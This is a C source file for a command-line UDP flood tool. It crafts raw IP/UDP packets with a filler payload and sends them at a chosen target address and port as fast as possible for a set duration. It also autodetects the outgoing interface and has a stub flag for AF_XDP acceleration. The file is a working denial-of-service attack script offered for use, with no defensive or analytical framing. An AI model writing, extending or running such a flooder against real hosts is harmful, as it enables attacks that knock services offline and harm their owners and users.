#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>

#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <net/if.h>
#include <ifaddrs.h>

/* ================= CONFIG ================= */
#define MAX_PKT_SIZE 1500
#define DEFAULT_PAYLOAD 64
#define DEFAULT_TIME 10

/* ================= OPTIONS ================= */
struct opts {
    int port;
    int time_sec;          // -t
    int payload_size;      // -d
    bool af_xdp;           // -X
    char iface[IFNAMSIZ];
    char target[64];
};

/* ================= PACKET ================= */
struct packet {
    uint8_t buf[MAX_PKT_SIZE];
    size_t len;
};

/* ================= CHECKSUM ================= */
static uint16_t checksum(uint16_t *buf, size_t len)
{
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len)
        sum += *(uint8_t *)buf;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

/* ================= AUTODETECT IFACE ================= */
static int autodetect_iface(const char *dst_ip, char *iface, size_t len)
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        return -1;

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(53);
    inet_pton(AF_INET, dst_ip, &dst.sin_addr);

    if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
        close(sock);
        return -1;
    }

    struct sockaddr_in src = {0};
    socklen_t slen = sizeof(src);
    getsockname(sock, (struct sockaddr *)&src, &slen);

    struct ifaddrs *ifaddr, *ifa;
    getifaddrs(&ifaddr);

    for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr)
            continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *in = (struct sockaddr_in *)ifa->ifa_addr;
            if (in->sin_addr.s_addr == src.sin_addr.s_addr) {
                strncpy(iface, ifa->ifa_name, len - 1);
                freeifaddrs(ifaddr);
                close(sock);
                return 0;
            }
        }
    }

    freeifaddrs(ifaddr);
    close(sock);
    return -1;
}

/* ================= PACKET BUILD ================= */
static void build_udp(struct packet *p, struct opts *o)
{
    memset(p, 0, sizeof(*p));

    struct iphdr *ip = (struct iphdr *)p->buf;
    struct udphdr *udp = (struct udphdr *)(p->buf + sizeof(*ip));
    uint8_t *payload = p->buf + sizeof(*ip) + sizeof(*udp);

    memset(payload, 'A', o->payload_size);

    udp->source = htons(12345);
    udp->dest   = htons(o->port);
    udp->len    = htons(sizeof(*udp) + o->payload_size);

    ip->ihl      = 5;
    ip->version  = 4;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_UDP;
    inet_pton(AF_INET, o->target, &ip->daddr);

    ip->tot_len = htons(sizeof(*ip) + sizeof(*udp) + o->payload_size);
    ip->check   = checksum((uint16_t *)ip, sizeof(*ip));

    p->len = sizeof(*ip) + sizeof(*udp) + o->payload_size;
}

/* ================= CLI ================= */
static void parse_cli(int argc, char **argv, struct opts *o)
{
    memset(o, 0, sizeof(*o));
    o->payload_size = DEFAULT_PAYLOAD;
    o->time_sec = DEFAULT_TIME;

    int c;
    while ((c = getopt(argc, argv, "p:d:t:i:X")) != -1) {
        switch (c) {
        case 'p': o->port = atoi(optarg); break;
        case 'd': o->payload_size = atoi(optarg); break;
        case 't': o->time_sec = atoi(optarg); break;
        case 'i': strncpy(o->iface, optarg, IFNAMSIZ - 1); break;
        case 'X': o->af_xdp = true; break;
        default:
            fprintf(stderr, "Usage: -p port -d payload -t time -i iface [-X] target\n");
            exit(1);
        }
    }

    if (optind >= argc || !o->port) {
        fprintf(stderr, "Missing target or port\n");
        exit(1);
    }

    strncpy(o->target, argv[optind], sizeof(o->target) - 1);

    if (o->payload_size <= 0 || o->payload_size > 1400) {
        fprintf(stderr, "Payload must be 1–1400 bytes\n");
        exit(1);
    }
}

/* ================= UDP TX ================= */
static void udp_tx(struct packet *p, struct opts *o)
{
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("socket");
        return;
    }

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, o->target, &dst.sin_addr);

    time_t start = time(NULL);
    uint64_t sent = 0;

    while (time(NULL) - start < o->time_sec) {
        sendto(s, p->buf, p->len, 0,
               (struct sockaddr *)&dst, sizeof(dst));
        sent++;
    }

    printf("[+] UDP sent %lu packets\n", sent);
    close(s);
}

/* ================= MAIN ================= */
int main(int argc, char **argv)
{
    struct opts o;
    struct packet pkt;

    parse_cli(argc, argv, &o);

    if (!o.iface[0]) {
        if (autodetect_iface(o.target, o.iface, sizeof(o.iface)) == 0)
            printf("[+] Interface autodetectata: %s\n", o.iface);
        else {
            fprintf(stderr, "[-] Impossibile autodetectare interfaccia\n");
            return 1;
        }
    }

    if (o.af_xdp) {
        printf("[!] your machine does not support this flag\n");
        printf("[!] fallback to UDP\n");
    }

    build_udp(&pkt, &o);
    udp_tx(&pkt, &o);
    return 0;
}